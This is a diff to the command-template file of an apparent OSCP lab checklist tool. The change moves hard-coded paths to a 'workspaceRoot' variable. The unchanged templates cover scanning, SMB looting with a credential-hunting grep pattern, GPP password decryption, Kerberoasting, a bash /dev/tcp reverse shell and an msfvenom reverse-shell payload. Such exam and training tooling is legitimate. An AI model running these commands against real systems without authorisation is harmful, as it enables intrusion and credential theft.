@@ -1,4 +1,5 @@
 export const DEFAULT_VARIABLES = {
+  workspaceRoot: "/home/kali/oscp",
   lhost: "10.10.14.2",
   lport: "443",
   rhost: "192.168.45.100",
@@ -17,6 +18,7 @@ export const DEFAULT_VARIABLES = {
 };
 
 export const VARIABLE_GROUPS = [
+  { label: "Workspace", keys: ["workspaceRoot"] },
   { label: "Operator", keys: ["lhost", "lport", "interface"] },
   { label: "Target", keys: ["targetName", "rhost", "rport", "subnet"] },
   { label: "Identity", keys: ["domain", "baseDn", "dc", "user", "password", "gppCpassword", "hash"] },
@@ -35,8 +37,8 @@ export const CHECKLIST = [
         title: "Create a target workspace",
         detail: "Keep raw scans and evidence separate from working files.",
         commands: [
-          { label: "Create folders", value: "mkdir -p ~/oscp/{{targetName}}/{scans,web,loot,exploits,notes} && cd ~/oscp/{{targetName}}" },
-          { label: "Start command log", value: "script -a ~/oscp/{{targetName}}/notes/terminal.log" },
+          { label: "Create folders", value: "mkdir -p {{workspaceRoot}}/{{targetName}}/{scans,web,loot,exploits,notes} && cd {{workspaceRoot}}/{{targetName}}" },
+          { label: "Start command log", value: "script -a {{workspaceRoot}}/{{targetName}}/notes/terminal.log" },
         ],
       },
       {
@@ -77,32 +79,32 @@ export const CHECKLIST = [
         id: "recon-tcp-all",
         title: "Scan all TCP ports",
         commands: [
-          { label: "Full TCP", value: "sudo nmap -Pn -n -p- --min-rate 2000 --max-retries 2 -oA ~/oscp/{{targetName}}/scans/tcp-all {{rhost}}" },
-          { label: "Extract ports", value: "grep -oP '\\d+/open' ~/oscp/{{targetName}}/scans/tcp-all.gnmap | cut -d/ -f1 | paste -sd, -" },
+          { label: "Full TCP", value: "sudo nmap -Pn -n -p- --min-rate 2000 --max-retries 2 -oA {{workspaceRoot}}/{{targetName}}/scans/tcp-all {{rhost}}" },
+          { label: "Extract ports", value: "grep -oP '\\d+/open' {{workspaceRoot}}/{{targetName}}/scans/tcp-all.gnmap | cut -d/ -f1 | paste -sd, -" },
         ],
       },
       {
         id: "recon-tcp-detail",
         title: "Fingerprint open TCP services",
         commands: [
-          { label: "Focused scan", value: "sudo nmap -Pn -n -sCV -p {{rport}} -oA ~/oscp/{{targetName}}/scans/tcp-detail {{rhost}}" },
-          { label: "Vulnerability hints", value: "nmap -Pn -n --script vuln -p {{rport}} -oN ~/oscp/{{targetName}}/scans/tcp-vuln.txt {{rhost}}" },
+          { label: "Focused scan", value: "sudo nmap -Pn -n -sCV -p {{rport}} -oA {{workspaceRoot}}/{{targetName}}/scans/tcp-detail {{rhost}}" },
+          { label: "Vulnerability hints", value: "nmap -Pn -n --script vuln -p {{rport}} -oN {{workspaceRoot}}/{{targetName}}/scans/tcp-vuln.txt {{rhost}}" },
         ],
       },
       {
         id: "recon-udp",
         title: "Check common UDP services",
         commands: [
-          { label: "Top UDP", value: "sudo nmap -Pn -n -sU --top-ports 100 --open -oA ~/oscp/{{targetName}}/scans/udp-top100 {{rhost}}" },
-          { label: "Focused UDP", value: "sudo nmap -Pn -n -sU -sV -p 53,69,111,123,161,500,623 -oN ~/oscp/{{targetName}}/scans/udp-detail.txt {{rhost}}" },
+          { label: "Top UDP", value: "sudo nmap -Pn -n -sU --top-ports 100 --open -oA {{workspaceRoot}}/{{targetName}}/scans/udp-top100 {{rhost}}" },
+          { label: "Focused UDP", value: "sudo nmap -Pn -n -sU -sV -p 53,69,111,123,161,500,623 -oN {{workspaceRoot}}/{{targetName}}/scans/udp-detail.txt {{rhost}}" },
         ],
       },
       {
         id: "recon-hostnames",
         title: "Resolve hostnames and virtual hosts",
         commands: [
-          { label: "Certificate names", value: "for port in $(echo '{{rport}}' | tr ',' ' '); do cert=$(echo | timeout 3 openssl s_client -connect {{rhost}}:$port -servername {{rhost}} 2>/dev/null | openssl x509 -noout -subject -ext subjectAltName 2>/dev/null); if [ -n \"$cert\" ]; then printf '\\n[+] Port %s:\\n%s\\n' \"$port\" \"$cert\"; fi; done | tee ~/oscp/{{targetName}}/scans/certificates.txt" },
-          { label: "SSL cert scan", value: "nmap -Pn -n -p {{rport}} --script ssl-cert -oN ~/oscp/{{targetName}}/scans/ssl-certs.txt {{rhost}}" },
+          { label: "Certificate names", value: "for port in $(echo '{{rport}}' | tr ',' ' '); do cert=$(echo | timeout 3 openssl s_client -connect {{rhost}}:$port -servername {{rhost}} 2>/dev/null | openssl x509 -noout -subject -ext subjectAltName 2>/dev/null); if [ -n \"$cert\" ]; then printf '\\n[+] Port %s:\\n%s\\n' \"$port\" \"$cert\"; fi; done | tee {{workspaceRoot}}/{{targetName}}/scans/certificates.txt" },
+          { label: "SSL cert scan", value: "nmap -Pn -n -p {{rport}} --script ssl-cert -oN {{workspaceRoot}}/{{targetName}}/scans/ssl-certs.txt {{rhost}}" },
           { label: "Hosts entry", value: "echo '{{rhost}} {{targetName}} {{dc}} {{domain}}' | sudo tee -a /etc/hosts" },
         ],
       },
@@ -121,7 +123,7 @@ export const CHECKLIST = [
         commands: [
           { label: "Anonymous SMB", value: "nxc smb {{rhost}} -u '' -p '' --shares --users --groups" },
           { label: "Authenticated SMB", value: "nxc smb {{rhost}} -u '{{user}}' -p '{{password}}' --shares --users --groups --sessions" },
-          { label: "Triage all downloaded SMB loot", value: "find ~/oscp/{{targetName}}/loot/smb -type f -printf '%s %p\\n' | sort -nr > ~/oscp/{{targetName}}/loot/smb-file-index.txt; grep -RniI -E 'pass(word)?|passwd|pwd|secret|token|api.?key|connection.?string|cpassword|user(name)?|BEGIN (RSA |OPENSSH )?PRIVATE KEY' ~/oscp/{{targetName}}/loot/smb | tee ~/oscp/{{targetName}}/loot/smb-credential-hits.txt" },
+          { label: "Triage all downloaded SMB loot", value: "find {{workspaceRoot}}/{{targetName}}/loot/smb -type f -printf '%s %p\\n' | sort -nr > {{workspaceRoot}}/{{targetName}}/loot/smb-file-index.txt; grep -RniI -E 'pass(word)?|passwd|pwd|secret|token|api.?key|connection.?string|cpassword|user(name)?|BEGIN (RSA |OPENSSH )?PRIVATE KEY' {{workspaceRoot}}/{{targetName}}/loot/smb | tee {{workspaceRoot}}/{{targetName}}/loot/smb-credential-hits.txt" },
         ],
       },
       {
@@ -129,7 +131,7 @@ export const CHECKLIST = [
         title: "Group Policy Preferences (GPP) credentials",
         detail: "A cpassword from an XML file is encrypted data, not the login password. Preserve the XML and its userName/runAs field, decrypt the cpassword, then replace the normal user/password variables with the recovered credential before retesting SMB.",
         commands: [
-          { label: "Find downloaded GPP XML", value: "grep -Rni --include='*.xml' -E 'cpassword|userName|runAs' ~/oscp/{{targetName}}/loot/smb" },
+          { label: "Find downloaded GPP XML", value: "grep -Rni --include='*.xml' -E 'cpassword|userName|runAs' {{workspaceRoot}}/{{targetName}}/loot/smb" },
           { label: "Decrypt one cpassword", value: "gpp-decrypt '{{gppCpassword}}'" },
           { label: "Parse a saved XML file", value: "impacket-Get-GPPPassword LOCAL -xmlfile /path/to/Groups.xml" },
           { label: "Search SYSVOL with valid credentials", value: "impacket-Get-GPPPassword '{{domain}}/{{user}}:{{password}}@{{rhost}}' -dc-ip {{rhost}}" },
@@ -157,7 +159,7 @@ export const CHECKLIST = [
         title: "SNMP (161/udp)",
         commands: [
           { label: "Find community", value: "onesixtyone -c /usr/share/seclists/Discovery/SNMP/common-snmp-community-strings.txt {{rhost}}" },
-          { label: "Walk", value: "snmpwalk -v2c -c public {{rhost}} .1 | tee ~/oscp/{{targetName}}/scans/snmpwalk.txt" },
+          { label: "Walk", value: "snmpwalk -v2c -c public {{rhost}} .1 | tee {{workspaceRoot}}/{{targetName}}/scans/snmpwalk.txt" },
         ],
       },
       {
@@ -188,7 +190,7 @@ export const CHECKLIST = [
         id: "web-baseline",
         title: "Capture headers, technology, and source",
         commands: [
-          { label: "Headers", value: "curl -k -i http://{{rhost}}:{{rport}}/ | tee ~/oscp/{{targetName}}/web/root-response.txt" },
+          { label: "Headers", value: "curl -k -i http://{{rhost}}:{{rport}}/ | tee {{workspaceRoot}}/{{targetName}}/web/root-response.txt" },
           { label: "Fingerprint", value: "whatweb -a 3 http://{{rhost}}:{{rport}}/" },
           { label: "Common files", value: "for p in robots.txt sitemap.xml .git/HEAD .env; do echo ===$p; curl -ks http://{{rhost}}:{{rport}}/$p; done" },
         ],
@@ -197,7 +199,7 @@ export const CHECKLIST = [
         id: "web-content",
         title: "Discover content and files",
         commands: [
-          { label: "Directories", value: "ffuf -u http://{{rhost}}:{{rport}}/FUZZ -w {{wordlist}} -e .php,.aspx,.txt,.bak,.zip -ac -c -o ~/oscp/{{targetName}}/web/ffuf-content.json" },
+          { label: "Directories", value: "ffuf -u http://{{rhost}}:{{rport}}/FUZZ -w {{wordlist}} -e .php,.aspx,.txt,.bak,.zip -ac -c -o {{workspaceRoot}}/{{targetName}}/web/ffuf-content.json" },
           { label: "Parameters", value: "ffuf -u 'http://{{rhost}}:{{rport}}/index.php?FUZZ=test' -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt -ac -c" },
         ],
       },
@@ -215,7 +217,7 @@ export const CHECKLIST = [
         detail: "Proxy interesting requests, change one input at a time, and record the exact request that proves impact.",
         commands: [
           { label: "Replay request", value: "curl -k -i -X POST 'http://{{rhost}}:{{rport}}/login' -d 'username={{user}}&password={{password}}'" },
-          { label: "SQLi confirmation", value: "sqlmap -r request.txt --batch --level 2 --risk 1 --output-dir=~/oscp/{{targetName}}/web/sqlmap" },
+          { label: "SQLi confirmation", value: "sqlmap -r request.txt --batch --level 2 --risk 1 --output-dir={{workspaceRoot}}/{{targetName}}/web/sqlmap" },
         ],
       },
     ],
@@ -239,7 +241,7 @@ export const CHECKLIST = [
         title: "Try remote access with discovered credentials",
         detail: "Commands are generated from the active credential and every saved account. A valid SMB login is not automatically a shell: Evil-WinRM requires WinRM and permission to use it, while NetExec SMB execution and WMI require administrator access. Look for Pwn3d in NetExec output. If authentication works but every shell method fails, continue with AD enumeration and Kerberoasting.",
         commands: [
-          { label: "Check remote-management ports", value: "nmap -Pn -n -sV --open -p 22,445,3389,5985,5986 -oN ~/oscp/{{targetName}}/scans/remote-access.txt {{rhost}}" },
+          { label: "Check remote-management ports", value: "nmap -Pn -n -sV --open -p 22,445,3389,5985,5986 -oN {{workspaceRoot}}/{{targetName}}/scans/remote-access.txt {{rhost}}" },
         ],
       },
       {
@@ -255,7 +257,7 @@ export const CHECKLIST = [
         title: "Prepare simple reverse-shell payloads",
         commands: [
           { label: "Bash", value: "bash -c 'bash -i >& /dev/tcp/{{lhost}}/{{lport}} 0>&1'" },
-          { label: "PowerShell", value: "msfvenom -p windows/x64/shell_reverse_tcp LHOST={{lhost}} LPORT={{lport}} -f exe -o ~/oscp/{{targetName}}/exploits/shell.exe" },
+          { label: "PowerShell", value: "msfvenom -p windows/x64/shell_reverse_tcp LHOST={{lhost}} LPORT={{lport}} -f exe -o {{workspaceRoot}}/{{targetName}}/exploits/shell.exe" },
         ],
       },
       {
@@ -396,7 +398,7 @@ export const CHECKLIST = [
         id: "ad-roast",
         title: "Check for AS-REP roastable users",
         commands: [
-          { label: "AS-REP into target loot", value: "loot=\"$HOME/oscp/{{targetName}}/loot/kerberos/asrep\"; mkdir -p \"$loot\"; impacket-GetNPUsers '{{domain}}/' -dc-ip {{rhost}} -usersfile users.txt -no-pass -format hashcat -outputfile \"$loot/asrep.hashes\" | tee \"$loot/enumeration.txt\"" },
+          { label: "AS-REP into target loot", value: "loot=\"{{workspaceRoot}}/{{targetName}}/loot/kerberos/asrep\"; mkdir -p \"$loot\"; impacket-GetNPUsers '{{domain}}/' -dc-ip {{rhost}} -usersfile users.txt -no-pass -format hashcat -outputfile \"$loot/asrep.hashes\" | tee \"$loot/enumeration.txt\"" },
         ],
       },
       {
@@ -404,7 +406,7 @@ export const CHECKLIST = [
         title: "Kerberoast SPN accounts into target loot",
         detail: "The active credential and every saved account generate separate GetUserSPNs commands. Enumeration output, TGS hashes, and cracked results stay under the current target and credential identity. Switch targets with Use in commands to produce that target's paths and DC address.",
         commands: [
-          { label: "Inventory saved SPN/TGS loot", value: "root=\"$HOME/oscp/{{targetName}}/loot/kerberos/spn_tgs\"; mkdir -p \"$root\"; find \"$root\" -type f -printf '%TY-%Tm-%Td %TH:%TM %s %p\\n' | sort" },
+          { label: "Inventory saved SPN/TGS loot", value: "root=\"{{workspaceRoot}}/{{targetName}}/loot/kerberos/spn_tgs\"; mkdir -p \"$root\"; find \"$root\" -type f -printf '%TY-%Tm-%Td %TH:%TM %s %p\\n' | sort" },
         ],
       },
       {
@@ -508,8 +510,8 @@ export const CHECKLIST = [
         id: "proof-artifacts",
         title: "Hash and inventory evidence",
         commands: [
-          { label: "Evidence hashes", value: "find ~/oscp/{{targetName}} -type f -print0 | sort -z | xargs -0 sha256sum > ~/oscp/{{targetName}}/notes/SHA256SUMS" },
-          { label: "File inventory", value: "find ~/oscp/{{targetName}} -type f -printf '%TY-%Tm-%Td %TH:%TM %s %p\n' | sort > ~/oscp/{{targetName}}/notes/inventory.txt" },
+          { label: "Evidence hashes", value: "find {{workspaceRoot}}/{{targetName}} -type f -print0 | sort -z | xargs -0 sha256sum > {{workspaceRoot}}/{{targetName}}/notes/SHA256SUMS" },
+          { label: "File inventory", value: "find {{workspaceRoot}}/{{targetName}} -type f -printf '%TY-%Tm-%Td %TH:%TM %s %p\n' | sort > {{workspaceRoot}}/{{targetName}}/notes/inventory.txt" },
         ],
       },
       {
